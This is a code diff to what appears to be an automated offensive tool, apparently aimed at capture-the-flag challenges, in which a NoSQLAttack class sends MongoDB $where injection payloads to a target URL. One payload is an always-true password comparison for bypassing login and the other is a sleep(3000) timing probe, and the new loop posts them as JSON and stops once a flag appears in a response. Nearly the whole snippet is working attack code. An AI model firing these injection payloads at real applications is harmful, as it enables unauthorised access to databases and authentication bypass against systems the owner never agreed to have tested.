@@ -28,8 +28,8 @@ URL_PARAM_PAYLOADS = [
 ]
 
 WHERE_PAYLOADS = [
-    '{"$where": "this.password == this.password"}',
-    '{"$where": "sleep(3000)"}',
+    {"$where": "this.password == this.password"},
+    {"$where": "sleep(3000)"},
 ]
 
 
@@ -96,7 +96,22 @@ class NoSQLAttack(BaseAttack):
                 except (json.JSONDecodeError, Exception):
                     pass
 
-            # Extra payloads from skills ($where, etc.)
+            # $where operator payloads (MongoDB JS eval)
+            for where_payload in WHERE_PAYLOADS:
+                if self._should_stop():
+                    break
+                try:
+                    response = await self.session.post(url, json=where_payload, timeout=10.0)
+                    if response.status_code in (200, 302) and len(response.text) > 10:
+                        findings, flag = await self._check_response(response, url, f"$where: {where_payload}")
+                        all_findings.extend(findings)
+                        if flag:
+                            self.stop_event.set()
+                            return all_findings
+                except Exception:
+                    pass
+
+            # Extra payloads from skills
             for raw_payload in payloads:
                 if self._should_stop():
                     break
